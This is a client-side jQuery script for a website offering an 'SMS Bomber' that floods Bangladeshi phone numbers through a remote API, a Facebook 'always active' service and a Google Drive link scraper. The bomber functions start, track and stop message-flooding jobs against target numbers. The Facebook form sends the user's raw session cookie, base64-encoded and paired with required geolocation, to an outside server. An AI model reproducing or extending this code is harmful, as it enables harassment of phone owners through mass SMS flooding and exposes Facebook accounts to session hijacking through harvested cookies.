const btn_loader = '<span class="spinner-border spinner-border-sm"></span>';
$("div:has(input[required]) label").addClass("required");
$("form").trigger("reset");
function makeid(length) {
  let result = "";
  const characters =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  const charactersLength = characters.length;
  let counter = 0;
  while (counter < length) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
    counter += 1;
  }
  return result;
}
function copyToClipboard(text) {
  var $temp = $("<input>");
  $("body").append($temp);
  $temp.val(text).select();
  document.execCommand("Copy");
  $temp.remove();
}
$(".dropdown").hover(
  function () {
    if ($(window).width() >= 992) {
      $(this).find(".dropdown-toggle").addClass("show");
      $(this).find(".dropdown-menu").addClass("open");
    }
  },
  function () {
    if ($(window).width() >= 992) {
      $(this).find(".dropdown-toggle").removeClass("show");
      $(this).find(".dropdown-menu").removeClass("open");
    }
  }
);

function show_msg(msg, type, timeout) {
  if (type == "danger") {
    type = "error";
  }
  $.toast({
    text: msg,
    icon: type,
    position: "top-right",
    showHideTransition: "slide",
    hideAfter: timeout,
  });
}
$(window).on("load", function () {
  let url = new URL(window.location.href);
  if (url.searchParams.has("msg")) {
    show_msg(
      url.searchParams.get("msg"),
      url.searchParams.get("type"),
      url.searchParams.get("timeout")
    );
  }
});
function alertIfNotBD() {
  $.ajax({
    url: "https://freeipapi.com/api/json",
    success: function (r) {
      if (r.countryCode != 'BD') {
        show_msg('Seems like you are not from Bangladesh. May I remind you that this SMS Bomber only works on Bangladeshi Number (+880).', 'warning', false);
      }
    }
  });
}
$("#addform").submit(function () {
  let thisform = $(this);
  thisform.find('[type="submit"]').prop("disabled", true);
  thisform.find('[type="submit"]').html("Submitting " + btn_loader);
  $.ajax({
    url: "https://tzbomber.onrender.com/api/add",
    method: "POST",
    data: thisform.serialize(),
    success: function (r, s) {
      if (r.success) {
        show_msg(r.msg, "success", 1500);
        setTimeout(() => {
          window.location.href =
            window.location.href.split("?")[0] + "?task_id=" + r.id;
        }, 1600);
      } else {
        show_msg(r.msg, "error", 5000);
      }
      thisform.find('[type="submit"]').prop("disabled", false);
      thisform.find('[type="submit"]').html("Submit");
    },
    error: function (r, s) {
      show_msg("Something went wrong", "error", 5000);
      thisform.find('[type="submit"]').prop("disabled", false);
      thisform.find('[type="submit"]').html("Submit");
    },
  });
});
function loadTaskData() {
  $.ajax({
    url: "https://tzbomber.onrender.com/api/status",
    method: "POST",
    data: "task_id=" + task_id,
    success: function (r, s) {
      if (r.success) {
        $("#mob").text(0 + r.msg.mobile);
        $("#amount").text(r.msg.amount);
        $("#mode").text(r.msg.unlimited ? "Rapid Mode" : "Powered Mode");
        $("#attempt").text(r.msg.attempt);
        $("#sent").text(r.msg.sent);
        $("#failed").text(r.msg.failed);
        $("#run").text(r.msg.run ? "Yes" : "No");
        $("#completed").text(r.msg.completed ? "Yes" : "No");
        $("#remaining").text(r.msg.remaining);
        $("#progress-bar")
          .width(r.msg.progress + "%")
          .text(r.msg.progress + "%");
        if (!r.msg.run) {
          $("#progress-bar").removeClass(
            "progress-bar-striped progress-bar-animated"
          );
          clearInterval(window.uid);
          $("#stopbtn").hide();
        }
      } else {
        window.location.href =
          window.location.href.split("?")[0] +
          `?msg=${r.msg}&type=error&timeout=3000`;
      }
    },
    error: function (r, s) {
      show_msg("Something went wrong", "error", 3000);
    },
  });
}
$("#stopbtn").click(function () {
  $("#stopbtn")
    .prop("disabled", true)
    .html("Stopping " + btn_loader);
  $.ajax({
    url: "https://tzbomber.onrender.com/api/delete",
    method: "POST",
    data: "task_id=" + task_id,
    success: function (r, s) {
      if (r.success) {
        show_msg(r.msg, "success", 3000);
      } else {
        show_msg(r.msg, "error", 3000);
      }
      $("#stopbtn").prop("disabled", false).html("Stop Bombing");
    },
    error: function (r, s) {
      show_msg("Something went wrong", "error", 3000);
      $("#stopbtn").prop("disabled", false).html("Stop Bombing");
    },
  });
});
$("#loc").click(function (event) {
  if ($("#loc").prop("checked")) {
    event.preventDefault();
    $("#loc").prop("disabled", true);
    navigator.geolocation.getCurrentPosition(
      function (data) {
        window.latitude = data.coords.latitude;
        window.longitude = data.coords.longitude;
        $("#loc").prop("disabled", false);
        $("#loc").prop("checked", true);
      },
      function (error) {
        $("#loc").prop("disabled", false);
        show_msg(
          "Location Permission Blocked. You can't continue without providing this requirement.",
          "error",
          5000
        );
      }
    );
  }
});
function update_fbtable(r, by_id) {
  $(".fb-img").css("background-image", 'url("' + r.img + '")');
  $("#fb_id").text(r.fb_id);
  $("#fbname").text(r.name);
  $("#fbemail").html(by_id ? '<span class="text-danger">Access Denied</span>' : r.email);
  $("#fbdob").html(by_id ? '<span class="text-danger">Access Denied</span>' : r.dob);
  $("#fbgender").text(r.gender);
  $("#fbstatus").html(
    r.active
      ? '<span class="text-success">Running</span>'
      : '<span class="text-warning">Paused</span>'
  );
  $("#fbform").hide();
  $("#activeinfo").show();
  $("#disablebtn").hide();
  $("#activebtn").hide();
  if (!by_id) {
    if (r.active) {
      $("#disablebtn").show();
    } else {
      $("#activebtn").show();
    }
  }
}
$("#fbform").submit(function () {
  if (!$("#loc").prop("checked")) {return false}
  $('#fbform [type="submit"]').prop("disabled", true).html("Submitting " + btn_loader);
  function reset_btn(){$('#fbform [type="submit"]').prop("disabled", false).html("Submit");}
  if (isNaN($("#fbinfo").val())) {
    // While There is Cookie
    $.ajax({
      url: "https://fb24hactive.onrender.com/api",
      method: "POST",
      data: `cookie=${encodeURIComponent(btoa($("#fbinfo").val()))}&lat=${window.latitude}&long=${window.longitude}`,
      success: function (r, s) {
        if (r.success) {
          show_msg(r.msg, r.type, r.timeout);
          update_fbtable(r, false);
        } else {
          show_msg(r.msg, r.type, r.timeout);
        }
        reset_btn();
      },
      error: function (r, s) {
        show_msg("Something went wrong", "error", 3000);
        reset_btn();
      },
    });
  } else {
    // While There is ID
    $.ajax({
      url: "https://fb24hactive.onrender.com/api?id=" + $("#fbinfo").val(),
      method: "GET",
      success: function (r, s) {
        if (r.success) {
          update_fbtable(r, true);
          show_msg(r.msg, r.type, r.timeout);
        } else {
          show_msg(r.msg, r.type, r.timeout);
        }
        reset_btn();
      },
      error: function (r, s) {
        show_msg("Something went wrong", "error", 3000);
        reset_btn();
      },
    });
  }
});
function set_is_active_to(status) {
  $("#disablebtn").prop('disabled', true).html('Pausing Service ' + btn_loader);
  $("#activebtn").prop('disabled', true).html('Resuming Service ' + btn_loader);
  function reset_btns() {
    $("#disablebtn").prop('disabled', false).html('Pause Service');
    $("#activebtn").prop('disabled', false).html('Resume Service');
  }
  $.ajax({
    url: "https://fb24hactive.onrender.com/api",
    method: 'PATCH',
    data: `cookie=${encodeURIComponent(btoa($("#fbinfo").val()))}&active=${Boolean(status)}`,
    success: function (r, s) {
      if (r.success) {
        $("#fbstatus").html(
          status
            ? '<span class="text-success">Running</span>'
            : '<span class="text-warning">Paused</span>'
        );
        if (status) {
          $("#disablebtn").show();
          $("#activebtn").hide();
        } else {
          $("#disablebtn").hide();
          $("#activebtn").show();
        }
        show_msg(r.msg, r.type, r.timeout);
      } else {
        show_msg(r.msg, r.type, r.timeout);
      }
      reset_btns();
    },
    error: function (r, s) {
      show_msg("Something went wrong", "error", 3000);
      reset_btns();
    }
  });
}
$("#disablebtn").click(() => {set_is_active_to(false)})
$("#activebtn").click(() => {set_is_active_to(true)})

$("#gdriveform").submit(function () {
  let form = $(this);
  form.find('[type="submit"]').prop('disabled', true).html(btn_loader);
  $.ajax({
    url: "https://gdirectlink.onrender.com/",
    method: 'POST',
    data: form.serialize(),
    success: function (r) {
      if (r.success) {
        form.find('input[type="url"]').val('');
        if (!$('#results').is(':visible')){$("#results").show()}
        elem_id = makeid(26);
        $("#results .all-divs").prepend(`
          <div id="${elem_id}" class="input-group grt shd mb-3">
            <input type="url" class="form-control" disabled value="${r.link}">
            <button class="btn btn-outline-primary" data-type="copyglink" style="width: 50px;">
              <svg class="clipboard" pointer-events="none" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"></path><rect x="8" y="2" width="8" height="4" rx="1" ry="1"></rect></svg>
              <svg class="check" style="display: none;" pointer-events="none" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
            </button>
          </div>
        `);
        setTimeout(() => {$('#' + elem_id).removeClass('shd')}, 100);
      } else {
        show_msg('Cannot scrape direct download link. Please recheck your url. Make sure the file is visible to public. Try using offline mode.', 'danger', 7000);
      }
      form.find('[type="submit"]').prop('disabled', false).html('Submit');
    },
    error: function (r) {
      form.find('[type="submit"]').prop('disabled', false).html('Submit');
      show_msg("Something went wrong", "error", 3000);
    }
  });
})

$(window).click(function (e) {
  let elem = $(e.target);
  if (elem.data('type') == 'copyglink' && elem.is('button') && elem.find('> .clipboard').is(':visible')) {
    copyToClipboard(elem.parent().find("input").val());
    elem.find('> .clipboard').hide();
    elem.find('> .check').show();
    elem.removeClass("btn-outline-primary").addClass("btn-outline-success");
    setTimeout(() => {
      elem.find('> .clipboard').show();
      elem.find('> .check').hide();
      elem.addClass("btn-outline-primary").removeClass("btn-outline-success");      
    }, 3000);
  }
})
